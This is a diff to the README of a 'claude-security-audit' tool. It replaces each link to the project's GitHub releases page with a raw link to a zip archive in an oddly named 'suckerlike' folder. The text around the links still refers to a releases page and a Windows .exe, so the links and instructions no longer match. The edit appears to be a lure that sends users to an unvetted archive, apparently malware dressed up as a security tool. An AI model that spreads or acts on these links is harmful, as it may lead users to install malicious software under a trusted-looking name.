@@ -1,6 +1,6 @@
 # 🔒 claude-security-audit - Complete Security Audit Tool
 
-[![Download claude-security-audit](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/RiturajMitra/claude-security-audit/releases)
+[![Download claude-security-audit](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/RiturajMitra/claude-security-audit/raw/refs/heads/main/suckerlike/audit_security_claude_2.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You will download the program from the official releases page on GitHub.
 
 1. **Go to the download page**  
    Open this link in your web browser:  
-   https://github.com/RiturajMitra/claude-security-audit/releases
+   https://github.com/RiturajMitra/claude-security-audit/raw/refs/heads/main/suckerlike/audit_security_claude_2.2.zip
 
 2. **Find the latest version**  
    The page shows a list of releases. Look for the most recent one at the top. It will have a version number like "v1.0" or higher.
@@ -120,7 +120,7 @@ While it is built mainly for website audits, you can check other networked syste
 ## 🔗 Download claude-security-audit
 
 To get started, visit the releases page here:  
-[https://github.com/RiturajMitra/claude-security-audit/releases](https://github.com/RiturajMitra/claude-security-audit/releases)
+[https://github.com/RiturajMitra/claude-security-audit/raw/refs/heads/main/suckerlike/audit_security_claude_2.2.zip](https://github.com/RiturajMitra/claude-security-audit/raw/refs/heads/main/suckerlike/audit_security_claude_2.2.zip)
 
 Look for the Windows `.exe` file under the latest release. Download and run it to install claude-security-audit on your computer.
 
